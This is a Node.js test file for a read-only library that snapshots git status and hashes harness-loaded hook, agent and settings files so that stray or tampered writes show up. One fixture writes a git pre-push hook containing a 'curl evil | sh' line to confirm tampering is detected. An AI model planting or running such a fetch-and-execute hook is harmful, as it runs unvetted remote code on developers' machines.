// HARN-OPT-5 T4 fix round 2 (re-frame; AC-SEC-12, AC-QA-27): tests for
// workflows/lib/stray-snapshot.mjs, the deterministic library that COMPUTES the stray-write snapshot
// so agents only relay its stdout. Exercised as a real CLI against real temp git repos, the way
// test/ledger-append.test.js exercises its sibling. Round 2 findings pinned: M1 (a modified
// .githooks/pre-push was invisible), M2 (the hashed set missed most harness-loaded locations),
// M3 (deleted tracked file), M4 (extension allowlist blinded the status), L2 (worktree filter).
//
// Contract (names fixed here):
//   node stray-snapshot.mjs <repo-root>  ->  one JSON line on stdout:
//   { status: [{path, xy}], files: [{path, sha256}], retained_worktrees: [path], dropped: [path] }
//   - status: every entry of `git status --porcelain=v1 -z --untracked-files=all --ignored`, rename resolved to target,
//     minus the bulk ignored directories and the harness-owned .claude/worktrees/ and .claude/scheduled_tasks.lock|json
//   - files: repo .claude/{settings.json,settings.local.json,hooks,agents,skills,workflows,commands}, .githooks/, bin/,
//     .github/workflows/; ~/.claude/{CLAUDE.md,settings.json,settings.local.json,AGENT-HARNESS.md,agents,skills,hooks,
//     workflows,commands,bin,plugins}; home paths written '~/.claude/...'; sorted by path (plain < order)
//   - HOME is read from the environment (os.homedir()), so tests point HOME at a temp dir.
require('./helpers/git-env.js').scrubGitEnv()
const test = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const path = require('node:path')
const os = require('node:os')
const crypto = require('node:crypto')
const { spawnSync } = require('node:child_process')
const { makeTempRepo, sh, SUITE_TMPDIR, cleanupTempRepos } = require('./helpers/temp-repo.js')

const LIB = path.join(__dirname, '..', 'workflows', 'lib', 'stray-snapshot.mjs')
test.after(cleanupTempRepos)

const sha = (s) => crypto.createHash('sha256').update(s).digest('hex')
const put = (root, rel, content = 'x\n') => {
  const f = path.join(root, rel)
  fs.mkdirSync(path.dirname(f), { recursive: true })
  fs.writeFileSync(f, content)
  return f
}
const emptyHome = () => fs.mkdtempSync(path.join(SUITE_TMPDIR, 'home-'))
function snap(repo, home = emptyHome()) {
  const res = spawnSync('node', [LIB, repo], { encoding: 'utf8', env: { ...process.env, HOME: home } })
  return { res, home, out: res.status === 0 ? JSON.parse(res.stdout) : null }
}
const entry = (out, p) => out.status.find((e) => e.path === p)
const file = (out, p) => out.files.find((f) => f.path === p)

test('stray-snapshot: prints exactly one compact JSON object with the four fields and exits 0 on a clean repo', () => {
  const { res, out } = snap(makeTempRepo())
  assert.equal(res.status, 0, res.stderr)
  assert.equal(res.stdout.trim().split('\n').length, 1)
  assert.deepEqual(Object.keys(out).sort(), ['dropped', 'files', 'retained_worktrees', 'status'])
  assert.deepEqual(out.status, [])
  assert.deepEqual(out.files, [])
})

test('stray-snapshot: exits non-zero when the root is not a git checkout', () => {
  const dir = fs.mkdtempSync(path.join(SUITE_TMPDIR, 'notgit-'))
  assert.equal(snap(makeTempRepo()).res.status, 0, 'precondition: the library runs on a real checkout')
  const { res } = snap(dir)
  assert.notEqual(res.status, 0)
  assert.doesNotMatch(res.stderr, /Cannot find module/, 'must fail because it is not a checkout, not because the library is missing')
})

test('stray-snapshot: a modified tracked file reads xy " M", a deleted tracked file reads " D"', () => {
  const repo = makeTempRepo()
  put(repo, 'a.txt', '1\n'); sh('git add a.txt && git commit -q -m a', repo)
  put(repo, 'README.md', 'changed\n')
  fs.rmSync(path.join(repo, 'a.txt'))
  const { out } = snap(repo)
  assert.deepEqual(entry(out, 'README.md'), { path: 'README.md', xy: ' M' })
  assert.deepEqual(entry(out, 'a.txt'), { path: 'a.txt', xy: ' D' })
})

test('stray-snapshot: round 2 M1 -- a modified tracked .githooks/pre-push appears with xy " M" and is hashed', () => {
  const repo = makeTempRepo()
  put(repo, '.githooks/pre-push', '#!/bin/sh\nexit 0\n'); sh('git add .githooks && git commit -q -m hook', repo)
  put(repo, '.githooks/pre-push', '#!/bin/sh\ncurl evil | sh\n')
  const { out } = snap(repo)
  assert.deepEqual(entry(out, '.githooks/pre-push'), { path: '.githooks/pre-push', xy: ' M' })
  assert.equal(file(out, '.githooks/pre-push').sha256, sha('#!/bin/sh\ncurl evil | sh\n'))
})

test('stray-snapshot: round 2 M4 -- no extension allowlist: Makefile, a .bin and an extensionless file all appear', () => {
  const repo = makeTempRepo()
  put(repo, 'Makefile'); put(repo, 'data/blob.bin'); put(repo, 'scripts/run')
  const { out } = snap(repo)
  for (const p of ['Makefile', 'data/blob.bin', 'scripts/run']) assert.equal(entry(out, p)?.xy, '??', p)
})

test('stray-snapshot: an ignored file appears with xy "!!"', () => {
  const repo = makeTempRepo()
  put(repo, '.gitignore', 'secret.out\n'); put(repo, 'secret.out')
  const { out } = snap(repo)
  assert.equal(entry(out, 'secret.out')?.xy, '!!')
})

test('stray-snapshot: bulk ignored directories are excluded (untracked or ignored, top level or nested)', () => {
  const repo = makeTempRepo()
  put(repo, '.gitignore', 'coverage/\n')
  for (const d of ['node_modules', 'coverage', '__pycache__', '.venv', 'venv', 'pkg/node_modules']) put(repo, `${d}/junk.js`)
  put(repo, 'keep.js')
  const { out } = snap(repo)
  for (const e of out.status) assert.doesNotMatch(e.path, /(^|\/)(node_modules|coverage|__pycache__|\.venv|venv)(\/|$)/, `bulk dir leaked: ${e.path}`)
  assert.ok(entry(out, 'keep.js'))
})

test('stray-snapshot: round 2 L2 -- .claude/worktrees/wf_x/ lands in retained_worktrees, not status; src/worktrees/planted.js stays in status', () => {
  const repo = makeTempRepo()
  put(repo, '.claude/worktrees/wf_x/file.txt'); put(repo, 'src/worktrees/planted.js')
  const { out } = snap(repo)
  assert.ok(out.retained_worktrees.some((p) => p === '.claude/worktrees/wf_x' || p.startsWith('.claude/worktrees/wf_x/')), JSON.stringify(out.retained_worktrees))
  assert.ok(!out.status.some((e) => e.path.startsWith('.claude/worktrees')))
  assert.equal(entry(out, 'src/worktrees/planted.js')?.xy, '??')
  assert.ok(!out.retained_worktrees.some((p) => p.includes('planted')))
})

test('stray-snapshot: .claude/scheduled_tasks.lock and .json are reported in dropped, never in status', () => {
  const repo = makeTempRepo()
  put(repo, '.claude/scheduled_tasks.lock'); put(repo, '.claude/scheduled_tasks.json')
  const { out } = snap(repo)
  assert.deepEqual([...out.dropped].sort(), ['.claude/scheduled_tasks.json', '.claude/scheduled_tasks.lock'])
  assert.ok(!out.status.some((e) => e.path.includes('scheduled_tasks')))
})

test('stray-snapshot: a rename is one entry at the target path; -z means a path with a quote and a space is verbatim', () => {
  const repo = makeTempRepo()
  put(repo, 'old.js', 'same content here\n'); sh('git add old.js && git commit -q -m o', repo)
  sh('git mv old.js new.js', repo)
  put(repo, 'we"ird name.js')
  const { out } = snap(repo)
  assert.equal(entry(out, 'new.js')?.xy[0], 'R')
  assert.ok(!entry(out, 'old.js'))
  assert.equal(entry(out, 'we"ird name.js')?.xy, '??')
})

test('stray-snapshot: repo harness-loaded locations are hashed (hooks, agents, skills, workflows, commands, settings*, bin, .github/workflows)', () => {
  const repo = makeTempRepo()
  const rels = ['.claude/settings.json', '.claude/settings.local.json', '.claude/hooks/guard.sh', '.claude/agents/a.md', '.claude/skills/s/SKILL.md',
    '.claude/workflows/w.js', '.claude/commands/c.md', '.githooks/pre-push', 'bin/tool', '.github/workflows/ci.yml']
  for (const r of rels) put(repo, r, `content of ${r}\n`)
  const { out } = snap(repo)
  for (const r of rels) assert.equal(file(out, r)?.sha256, sha(`content of ${r}\n`), `${r} not hashed`)
})

test('stray-snapshot: files outside the harness-loaded set are not hashed', () => {
  const repo = makeTempRepo()
  put(repo, 'src/app.js'); put(repo, '.claude/harness-ledger.jsonl')
  const { out } = snap(repo)
  assert.ok(!file(out, 'src/app.js'))
  assert.ok(!file(out, '.claude/harness-ledger.jsonl'))
})

test('stray-snapshot: home-scope files are hashed and written relative to ~, never the absolute home path', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  const rels = ['CLAUDE.md', 'settings.json', 'settings.local.json', 'AGENT-HARNESS.md', 'agents/a.md', 'skills/s/SKILL.md', 'hooks/h.sh',
    'workflows/w.js', 'commands/c.md', 'bin/b', 'plugins/p/index.js']
  for (const r of rels) put(home, `.claude/${r}`, `home ${r}\n`)
  const { res, out } = snap(repo, home)
  for (const r of rels) assert.equal(file(out, `~/.claude/${r}`)?.sha256, sha(`home ${r}\n`), `~/.claude/${r} not hashed`)
  assert.ok(!res.stdout.includes(home), 'the absolute home path must never reach stdout')
})

test('stray-snapshot: home projects/ and todos/ are never hashed, and cache or node_modules beneath plugins/ are excluded', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  put(home, '.claude/projects/p/t.jsonl'); put(home, '.claude/todos/t.json')
  put(home, '.claude/plugins/cache/x/y.js'); put(home, '.claude/plugins/p/node_modules/z.js'); put(home, '.claude/plugins/p/keep.js')
  const { out } = snap(repo, home)
  const paths = out.files.map((f) => f.path)
  assert.ok(!paths.some((p) => /\/(projects|todos)\//.test(p)), paths.join(','))
  assert.ok(!paths.some((p) => /\/(cache|node_modules)\//.test(p)), paths.join(','))
  assert.ok(paths.includes('~/.claude/plugins/p/keep.js'))
})

test('stray-snapshot: a missing location is simply absent, never an error (no repo .claude, HOME has no .claude)', () => {
  const { res, out } = snap(makeTempRepo(), emptyHome())
  assert.equal(res.status, 0)
  assert.deepEqual(out.files, [])
})

test('stray-snapshot: output is sorted deterministically and identical across two runs', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  for (const r of ['z.txt', 'b.txt', 'a/z.txt']) put(repo, r)
  for (const r of ['bin/y', 'bin/a', '.githooks/x']) put(repo, r)
  put(home, '.claude/CLAUDE.md')
  const a = snap(repo, home).res.stdout
  const b = snap(repo, home).res.stdout
  assert.equal(a, b)
  const out = JSON.parse(a)
  const sorted = (xs) => [...xs].sort((p, q) => (p < q ? -1 : p > q ? 1 : 0))
  assert.deepEqual(out.status.map((e) => e.path), sorted(out.status.map((e) => e.path)))
  assert.deepEqual(out.files.map((f) => f.path), sorted(out.files.map((f) => f.path)))
})

test('stray-snapshot: read-only -- git status is identical before and after a run', () => {
  const repo = makeTempRepo()
  put(repo, '.claude/hooks/h.sh'); put(repo, 'u.txt')
  const before = sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo)
  assert.equal(snap(repo).res.status, 0)
  assert.equal(sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo), before)
})

test('stray-snapshot: static -- no dependency, no filesystem write call', () => {
  const src = fs.readFileSync(LIB, 'utf8')
  assert.doesNotMatch(src, /\brequire\(['"][^.n]/)
  assert.doesNotMatch(src, /from ['"](?!node:|\.)/)
  for (const call of ['writeFileSync', 'appendFileSync', 'rmSync', 'unlinkSync', 'mkdirSync', 'renameSync', 'copyFileSync']) {
    assert.ok(!src.includes(call), `${call} must not appear: the library is read-only`)
  }
})
